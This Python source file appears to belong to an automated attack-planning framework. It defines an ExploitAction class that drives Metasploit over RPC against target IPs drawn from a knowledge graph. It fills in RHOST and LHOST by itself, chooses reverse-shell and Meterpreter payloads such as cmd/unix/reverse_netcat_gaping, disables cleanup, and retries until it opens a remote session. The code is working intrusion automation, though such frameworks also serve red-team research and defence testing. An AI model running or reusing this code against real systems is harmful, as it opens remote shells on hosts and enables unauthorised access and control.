import re
import os
from netifaces import ifaddresses, AF_INET, gateways
from pymetasploit3.msfrpc import MsfRpcClient

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, Pattern, MultiPattern
from kg_api.query import Query
from Session import SessionManager
from motifs import ActionInputMotif, ActionOutputMotif

# Taken from https://docs.rapid7.com/metasploit/working-with-payloads/
preferred_payloads = {
    "windows": [
        "windows/meterpreter/reverse_tcp",
        "windows/x64/meterpreter/reverse_tcp",
        "windows/meterpreter/reverse_nonx_tcp",
        "windows/x64/meterpreter/reverse_nonx_tcp",
        "windows/meterpreter/reverse_ord_tcp",
        "windows/x64/meterpreter/reverse_ord_tcp",
        "windows/shell/reverse_tcp",
        "windows/x64/shell/reverse_tcp",
    ],
    "linux": [
        "cmd/unix/reverse",
        "cmd/unix/reverse_perl",
        "cmd/unix/reverse_netcat_gaping",
        "cmd/unix/interact", 
    ],
    "java": [
        "java/meterpreter/reverse_tcp",
    ],
    "php": [
        "php/meterpreter/reverse_tcp",
        "php/meterpreter_reverse_tcp",
    ],
    "ruby": [
        "ruby/shell_reverse_tcp",
    ],
    "other": [   
        "generic/shell_reverse_tcp",
    ]
}

class ExploitAction(Action):
    """Generic class that we'll subclass again for each exploit"""

    def __init__(self, name: str, module_name: str, cves: list):
        super().__init__(name, "T1203", "TA0002", ["loud", "fast"])
        self.noise = 0.8
        self.impact = 0.5
        self.module_name = module_name
        self.cves = cves
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()
        
    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Expected outcome of the action
        """
        cve_or_service = pattern.get('service').get('protocol')
        if pattern.get('vuln'):
            cve_or_service = pattern.get('vuln').get('id')
        return [
            f"Exploit {cve_or_service} on port {pattern.get('port').get('number')} on {pattern.get('asset').get('ip_address')}"
        ]

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for ExploitAction.
        """
        input_motif = ActionInputMotif(
            name="InputMotif_ExploitAction",
            description="Input motif for ExploitAction"
        )

        input_motif.add_template(
            template_name="existing_asset",
            entity=Entity('Asset', alias='asset'),
        )

        input_motif.add_template(
            template_name="existing_port",
            entity=Entity('OpenPort', alias='port'),
            match_on="existing_asset",
            relationship_type="has",
            invert_relationship=True,
        )

        input_motif.add_template(
            template_name="existing_service",
            entity=Entity('Service', alias='service'),
            match_on="existing_port",
            relationship_type="is_running",
            invert_relationship=True,
        )
        
        input_motif.add_template(
            template_name="existing_vulnerability",
            entity=Entity('Vulnerability', alias='vuln'),
            match_on="existing_service",
            relationship_type="exposes",
            invert_relationship=True,
        )

        return input_motif
    
    def get_target_query(self) -> Query:
        """
        Target query for the action
        """
        query = self.input_motif.get_query()
        vuln = MultiPattern(query.get_patterns()).get('vuln')
        query.where(vuln.id.is_in(self.cves))
        query.ret_all()
        return query

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif for ExploitAction.
        """
        output_motif = ActionOutputMotif(
            name="OutputMotif_ExploitAction",
            description="Output motif for ExploitAction"
        )
        
        service = Entity('Service', alias='service')

        output_motif.add_template(
            template_name="discovered_session",
            entity=Entity('Session', alias='session', protocol='shell'),
            relationship_type="executes_on",
            match_on=service,
            expected_attributes=["id"],
        )
        
        output_motif.add_template(
            template_name="discovered_session",
            entity=Entity('Session', alias='session', protocol='msf'),
            relationship_type="executes_on",
            match_on=service,
            expected_attributes=["id"],
        )

        return output_motif
    
    def populate_output_motif(self, pattern: Pattern, discovered_data: dict) -> None:
        """
        Populate the output motif for ExploitAction.
        """
        changes: StateChangeSequence = []        
        if discovered_data:    
            service = pattern.get('service')
            session_change = self.output_motif.instantiate(
                template_name="discovered_session",
                match_on_override=service,
                protocol=discovered_data["session_type"],
                id=discovered_data["session"],
            )
            changes.append(session_change)
        return changes
        
    def parse_output(self, output: ActionExecutionResult) -> dict:
        """
        Parse the output of the ExploitAction action.
        """
        if output.session:
            session_type = output.command[-1]
            return {
                "session": output.session,
                "session_type": session_type,
            }

    def capture_state_change(
        self, artefacts, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Maybe add the session to the kg
        """
        discovered_data = self.parse_output(output)
        changes = self.populate_output_motif(pattern, discovered_data)
        return changes

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Execute the exploit
        """
        msf = sessions.get_named_session("metasploit_client")

        exploit = msf.modules.use("exploit", self.module_name)
        host = pattern.get('asset').get('ip_address')
        
        if 'RHOST' in exploit.options:
            exploit['RHOST'] = host
        if 'rhost' in exploit.options:
            exploit['rhost'] = host
        if 'RHOSTS' in exploit.options:
            exploit['RHOSTS'] = host
        if 'LHOST' in exploit.options:
            exploit['LHOST'] = ifaddresses(
                gateways()["default"].get(AF_INET, [gateways()[AF_INET][0]])[1]
            ).setdefault(AF_INET)[0]['addr']
            
        if pattern.get('port') and 'RPORT' in exploit.options:
            exploit['RPORT'] = pattern.get('port').get('number')
            
        if 'AllowNoCleanup' in exploit.options:
            exploit["AllowNoCleanup"] = True
        
        if hasattr(exploit, "missing_required"):
            for option in exploit.missing_required:
                if option in exploit.default_options:
                    exploit[option] = exploit.default_options[option]

        payload_type = "shell"
        payload = None
        possible_payloads = exploit.targetpayloads()
        
        if possible_payloads:
            service_type = pattern.get('service').get('protocol').lower()
            if service_type in preferred_payloads:
                for preferred_payload in preferred_payloads[service_type]:
                    if preferred_payload in possible_payloads:
                        if "meterpreter" in preferred_payload:
                            payload_type = "msf"
                        payload = msf.modules.use('payload', preferred_payload)
                        break
                    
            os_type = pattern.get('asset').get('os_family').lower()
            if payload is None and os_type in preferred_payloads:
                for preferred_payload in preferred_payloads[os_type]:
                    if preferred_payload in possible_payloads:
                        if "meterpreter" in preferred_payload:
                            payload_type = "msf"
                        payload = msf.modules.use('payload', preferred_payload)
                        break
        
            if payload is None:
                for preferred_payload in preferred_payloads["other"]:
                    if preferred_payload in possible_payloads:
                        if "meterpreter" in preferred_payload:
                            payload_type = "msf"
                        payload = msf.modules.use('payload', preferred_payload)
                        break
                    
            if payload is None:
                if "meterpreter" in possible_payloads[0]:
                    payload_type = "msf"
                payload = msf.modules.use('payload', possible_payloads[0])
        
            if 'LHOST' in payload.options:
                payload['LHOST'] = ifaddresses(
                    gateways()["default"].get(AF_INET, [gateways()[AF_INET][0]])[1]
                ).setdefault(AF_INET)[0]['addr']
                
        # Some exploits need executing twice to work
        for _ in range(3):
            if payload:
                output = msf.consoles.console().run_module_with_output(exploit, payload=payload)
            else:
                output = msf.consoles.console().run_module_with_output(exploit)

            matches = re.search(r'session (\d+) opened', output.lower().strip())
            if matches:
                ms_session_id = matches.group(1)
                channel = msf.sessions.session(ms_session_id)
                sess_id = sessions.add_session(channel)
                return ActionExecutionResult(
                    command=["msfrpc", "exploit", self.module_name, "session", payload_type],
                    stdout=output,
                    session=sess_id,
                    logs=[f"Established session ID {sess_id} (msf session ID is {ms_session_id}) on {host} using msf module {self.module_name}"]
                )
        
        return ActionExecutionResult(
            command=["msfrpc", "exploit", self.module_name],
            stdout=output,
            exit_status=1,
            logs=[f"Couldn't create msf session on {host} using msf module {self.module_name}"]
        )
    